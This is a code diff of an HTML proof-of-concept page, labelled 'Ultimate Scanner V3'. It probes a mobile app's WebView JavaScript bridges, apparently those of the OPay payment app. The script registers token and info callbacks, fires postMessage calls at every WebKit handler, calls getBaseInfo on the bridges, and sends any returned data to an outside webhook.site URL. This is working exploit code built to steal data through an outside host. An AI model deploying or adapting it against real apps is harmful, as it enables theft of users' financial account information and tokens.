@@ -4,23 +4,24 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner v2</title>
+    <title>Ultimate Scanner</title>
 </head>
 
-<body style="background: green; color: white; font-family: sans-serif; text-align: center; padding: 20px;">
+<body
+    style="background: green; color: white; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
     <h1 id="status">SCANNING...</h1>
-    <p>Please wait...</p>
-    <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.5;"></div>
+    <div id="log" style="font-size: 10px; color: #fff; text-align: left; opacity: 0.8;"></div>
 
     <script>
         (function () {
             var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
-            var status = document.getElementById('status');
             var logDiv = document.getElementById('log');
 
-            function report(msg) {
-                logDiv.innerHTML += '<div>' + msg + '</div>';
-                new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&v=2&ts=' + Date.now();
+            function report(msg, type) {
+                var div = document.createElement('div');
+                div.innerText = msg;
+                logDiv.appendChild(div);
+                new Image().src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info') + '&ts=' + Date.now();
             }
 
             function exfil(obj) {
@@ -29,40 +30,63 @@
                 xhr.send(JSON.stringify(obj));
             }
 
-            report('POC2 LOADED');
+            report('ULTIMATE SCANNER V3 START');
 
-            // Define callbacks
-            var cbs = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'opayCallback'];
-            cbs.forEach(function (n) {
+            // 1. Register massive callback list
+            var callbacks = ['onGetBaseInfo', 'onGetToken', 'nativeCallback', 'receiveMessage', 'opayCallback', 'onReceiveNativeMessage'];
+            callbacks.forEach(function (n) {
                 window[n] = function (d) {
-                    report('CALLBACK: ' + n);
-                    exfil({ cb: n, data: d });
-                    status.innerText = 'SUCCESS';
+                    report('CALLBACK TRIGGERED: ' + n, 'success');
+                    exfil({ source: 'callback', name: n, data: d });
                 };
             });
 
-            // Scan bridges
+            // 2. Wait and Scan
             setTimeout(function () {
-                var targets = ['control', 'OPay3PartyContext', 'webkit'];
-                targets.forEach(function (t) {
-                    if (window[t]) report('FOUND: ' + t);
+                report('Starting Scan...');
 
-                    // Try postMessage
-                    if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[t]) {
-                        report('POST: ' + t);
-                        window.webkit.messageHandlers[t].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
+                // Inspect window for anything suspicious
+                var suspects = [];
+                for (var key in window) {
+                    if (key.toLowerCase().indexOf('opay') !== -1 || key.toLowerCase().indexOf('context') !== -1 || key.toLowerCase().indexOf('bridge') !== -1) {
+                        suspects.push(key);
                     }
+                }
+                report('Suspects: ' + suspects.join(', '));
 
-                    // Try direct call
-                    if (window[t] && window[t].getBaseInfo) {
+                // Check WebKit specifically
+                if (window.webkit && window.webkit.messageHandlers) {
+                    var handlers = Object.keys(window.webkit.messageHandlers);
+                    report('iOS Handlers: ' + handlers.join(', '));
+
+                    handlers.forEach(function (h) {
                         try {
-                            var res = window[t].getBaseInfo();
-                            report('DIRECT: ' + t);
-                            exfil({ bridge: t, data: res });
-                        } catch (e) { }
+                            report('Firing postMessage to ' + h);
+                            window.webkit.messageHandlers[h].postMessage({ action: 'getBaseInfo', callback: 'onGetBaseInfo' });
+                            window.webkit.messageHandlers[h].postMessage({ method: 'getBaseInfo', cb: 'onGetBaseInfo' });
+                        } catch (e) { report('Error firing ' + h + ': ' + e.message); }
+                    });
+                } else {
+                    report('No window.webkit found');
+                }
+
+                // Check direct bridges
+                var commonBridges = ['control', 'OPay3PartyContext', 'ORideContext'];
+                commonBridges.forEach(function (b) {
+                    if (window[b]) {
+                        report('Checking Bridge: ' + b);
+                        if (window[b].getBaseInfo) {
+                            try {
+                                var res = window[b].getBaseInfo();
+                                report('Data captured from ' + b, 'success');
+                                exfil({ source: 'direct', bridge: b, data: res });
+                            } catch (e) { report('Error calling ' + b + ': ' + e.message); }
+                        }
                     }
                 });
-            }, 1000);
+
+                report('Scan Complete');
+            }, 2000);
         })();
     </script>
 </body>
